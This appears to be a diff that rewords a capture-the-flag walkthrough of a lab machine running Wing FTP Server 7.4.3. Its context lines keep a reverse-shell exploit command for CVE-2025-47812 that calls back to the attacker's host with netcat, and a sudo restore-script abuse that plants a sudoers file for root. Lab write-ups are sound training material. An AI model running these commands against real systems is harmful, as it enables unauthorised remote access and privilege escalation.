@@ -48,7 +48,7 @@ OS and Service detection performed. Please report any incorrect results at https
 ftp.wingdata.htb
 ```
 
-Hosted **Wing FTP Server v7.4.3**.
+The subdomain hosted **Wing FTP Server v7.4.3**.
 
 # User
 
@@ -62,7 +62,7 @@ Wing FTP Server 7.4.3 is vulnerable to **CVE-2025-47812** — unauthenticated RC
 python3 52347.py -u http://ftp.wingdata.htb/ -c 'busybox nc 10.10.14.42 9001 -e bash'
 ```
 
-Caught a shell as `wingftp`. The box held two other users: `root` and `wacky`.
+Caught a shell as `wingftp` — the box held two other users, `root` and `wacky`.
 
 ## Cracking wacky
 
@@ -139,7 +139,7 @@ Transfer it to wacky and run the restore:
 sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_999.tar -r restore_test
 ```
 
-Extraction drops `/etc/sudoers.d/wacky`, granting wacky full root:
+Extraction drops `/etc/sudoers.d/wacky`, granting wacky full root — a plain `sudo su` does the rest:
 
 ```sh
 sudo su
